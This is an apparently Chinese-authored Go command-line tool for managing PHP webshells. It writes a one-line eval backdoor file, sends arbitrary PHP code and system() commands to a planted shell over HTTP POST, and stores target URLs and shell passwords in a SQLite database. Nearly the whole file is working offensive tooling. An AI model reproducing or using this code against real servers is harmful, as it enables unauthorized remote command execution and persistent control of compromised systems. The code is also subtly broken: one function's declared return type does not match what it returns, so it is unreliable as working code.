package main

import (
	"database/sql"
	"flag"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
)

// 常量定义
const (
	userAgent   = `Mozilla/5.0 (iPod; U; CPU iPhone OS 3_2 like Mac OS X; cmn-TW) AppleWebKit/533.20.7 (KHTML, like Gecko) Version/3.0.5 Mobile/8B119 Safari/6533.20.7`
	contentType = "application/x-www-form-urlencoded"
	httpURL     = "http://test.test/eval.php"
)

func addURL() {
	var url, passwd, ua, other string
	fmt.Printf("输入添加的url:\t")
	fmt.Scanln(&url)
	fmt.Printf("输入添加的passwd:\t")
	fmt.Scanln(&passwd)
	fmt.Printf("输入添加的ua:\t")
	fmt.Scanln(&ua)
	fmt.Printf("输入备注:\t")
	fmt.Scanln(&other)
	db, err := connectDb()
	handleError(err, "连接数据库出错!")
	defer db.Close()
	insertDataSQL := `
    INSERT INTO info (url, passwd, ua, other) VALUES (?, ?, ?, ?);`
	_, err = db.Exec(insertDataSQL, url, passwd, ua, other)
	if err != nil {
		handleError(err, "插入数据出错!")
		return
	}
	fmt.Println("数据已成功添加!")
}

func connectDb() (*sql.DB, error) {
	db, err := sql.Open("sqlite3", "test.db")
	handleError(err, "打开数据库错误!")
	return db, nil
}

// handleError 函数用于处理错误，打印错误消息
func handleError(err error, message string) {
	if err != nil {
		fmt.Printf("%s: %v\n", message, err)
		log.Fatal(err)
	}
}

func selectDb() {
	db, err := sql.Open("sqlite3", "test.db")
	handleError(err, "打开数据库错误!")
	defer db.Close()

	rows, err := db.Query("select id, url, passwd, ua from info;")
	handleError(err, "查询数据库错误!")
	defer rows.Close()

	for rows.Next() {
		var id int
		var url, passwd, ua string
		err := rows.Scan(&id, &url, &passwd, &ua)
		handleError(err, "遍历数据库内容出错!")

		fmt.Printf("id:%d url:%s passwd:%s ua:%s\n", id, url, passwd, ua)
	}
}

func checkFile() {
	_, err := os.Stat("test.db")
	if err == nil {
	} else if os.IsNotExist(err) {
		fmt.Println("检测到数据库配置文件不存在，将创建数据库!")
		createTable()
	} else {
		fmt.Printf("检查文件错误: %v\n", err)
	}
}

func createTable() {
	db, err := sql.Open("sqlite3", "test.db")
	handleError(err, "打开数据库错误!")
	defer db.Close()

	createTableSQL := `
    CREATE TABLE IF NOT EXISTS info (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        url TEXT NOT NULL,
        passwd TEXT NOT NULL,
        ua TEXT NOT NULL,
        other TEXT NOT NULL
    );`

	_, err = db.Exec(createTableSQL)
	handleError(err, "创建数据库出错!")

	insertDataSQL := `
    INSERT INTO info (url, passwd, ua, other) VALUES (?, ?, ?, ?);`

	_, err = db.Exec(insertDataSQL, "http://test.test", "cmd", "test_ua", "备注信息")
	handleError(err, "插入数据出错!")
}

// makeRequest 函数用于创建并发送 HTTP POST 请求
func makeRequest(payload string) (*http.Response, error) {

	req, err := http.NewRequest("POST", httpURL, strings.NewReader(payload))
	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Content-Type", contentType)

	client := &http.Client{}
	return client.Do(req) // 发送请求并返回响应
}

func shellExec(payload string) {
	shellPayload := "cmd=system('" + payload + "');" // 修改此行，修复字符串拼接问题
	respShell, err := makeRequest(shellPayload)
	handleError(err, "请求执行系统命令失败")
	defer func(body io.ReadCloser) {
		err := body.Close()
		handleError(err, "关闭响应失败")
	}(respShell.Body)

	// 读取和打印系统命令执行响应
	bodyShell, err := io.ReadAll(respShell.Body)
	handleError(err, "读取响应体失败")

	if string(bodyShell) != "" {
		fmt.Println("执行系统命令响应:")
		fmt.Println(string(bodyShell))

	}
	//return string(bodyShell)
}

func phpinfo() {
	info := executeCode("phpinfo()")
	fmt.Println(info)

}

func executeCode(payload string) *http.Response {
	evalPayload := "cmd=" + payload + ";"
	// 使用 makeRequest 发送 PHP 代码执行请求
	respEval, err := makeRequest(evalPayload)
	handleError(err, "请求执行代码失败")

	// 延迟关闭响应体
	defer func(body io.ReadCloser) {
		err := body.Close()
		handleError(err, "关闭响应失败")
	}(respEval.Body)

	// 读取和打印 PHP 代码执行响应
	bodyEval, err := io.ReadAll(respEval.Body)
	handleError(err, "读取响应体失败")

	if string(bodyEval) != "" {
		fmt.Println("执行代码响应:")
		fmt.Println(string(bodyEval))
	}
	return bodyEval

}

func generateWebShell() {
	text := `<?php eval($_REQUEST['shell']);`
	filename := `shell.php`
	file, err := os.Create(filename)
	handleError(err, "创建文件时出错!")
	io.WriteString(file, text)
	handleError(err, "写入文件出错")
	fmt.Printf("生成文件成功!文件名:%s\n", filename)
}

// printLogo 函数用于打印程序的 Logo 和帮助信息
func printLogo() {
	logo := `
      ____            _
     / ___| ___   ___| | __
    | |  _ / _ \ / __| |/ /
    | |_| | (_) | (__|   <
     \____|\___/ \___|_|\_\
    `
	fmt.Printf("%s\n", logo)
	fmt.Println("--help\t显示完整帮助信息\n--cmd\t输入要执行的 PHP 代码(省略`;`)\n--shell\t利用 system 函数执行系统命令\n--generate-shell 生成简单的web_shell\n--dbinfo 显示目前数据库信息\n--adddb\t添加数据\n--phpinfo\t显示phpinfo信息\n------------华丽的分割线-----------")
}

func main() {
	showHelp := flag.Bool("help", false, "显示帮助信息")
	code := flag.String("cmd", "", "执行 PHP 代码")
	shell := flag.String("shell", "", "利用system函数执行系统命令")
	webShell := flag.Bool("generate-shell", false, "生成php的一句话木马")
	dbInfo := flag.Bool("dbinfo", false, "显示目前数据库信息")
	addDb := flag.Bool("adddb", false, "添加数据")
	phpInfo := flag.Bool("phpinfo", false, "查看phpinfo")

	flag.Parse()

	if *showHelp {
		printLogo()
	} else if *code != "" {
		executeCode(*code)
	} else if *shell != "" {
		shellExec(*shell)
	} else if *webShell {
		generateWebShell()
	} else if *dbInfo {
		selectDb()
	} else if *addDb {
		addURL()
	} else if *phpInfo {
		phpinfo()
	} else {
		printLogo()
	}

	checkFile()
}
